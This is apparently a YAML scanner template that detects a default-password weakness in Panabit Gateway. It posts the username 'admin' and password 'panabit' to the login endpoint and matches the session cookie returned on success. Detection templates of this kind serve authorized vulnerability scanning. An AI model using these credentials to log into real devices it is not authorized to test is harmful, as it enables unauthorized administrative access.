id: poc-yaml-panabit-gateway-default-password
info:
  name: Panabit Gateway 默认密码漏洞
  severity: medium
  tags:
  - 访问控制错误
  finger: Panabit Gateway
  reference: []
  description: null
variables: {}
transport: http
requests:
- method: POST
  path: /login/userverify.cgi
  headers: {}
  data: username=admin&password=panabit
  redirect: false
  raw: null
  timeout: null
  expression: status_code == 200 && contains(headers, "Set-Cookie") && contains(headers,
    "paonline_admin") && contains(body, "URL=/index.htm")
  output: []
